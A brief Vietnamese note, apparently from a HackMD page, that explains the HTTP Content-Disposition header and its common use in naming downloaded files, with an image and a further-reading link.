- **Content-Disposition** là một tiêu đề HTTP được sử dụng để xác định cách mà tài nguyên nên được xử lý hoặc hiển thị. Nó thường được sử dụng trong các phản hồi HTTP từ máy chủ đến trình duyệt web, đặc biệt là khi trình duyệt nhận các tệp tải xuống. - Một trong những cách phổ biến nhất để sử dụng tiêu đề Content-Disposition là để chỉ định tên tệp và/hoặc cách trình duyệt web nên xử lý tệp đó
  ![image](https://hackmd.io/_uploads/rJorO-Hoa.png)

## Đọc thêm

https://hackmd.io/@meowhecker/rJF4EfKuT?utm_source=preview-mode&utm_medium=rec
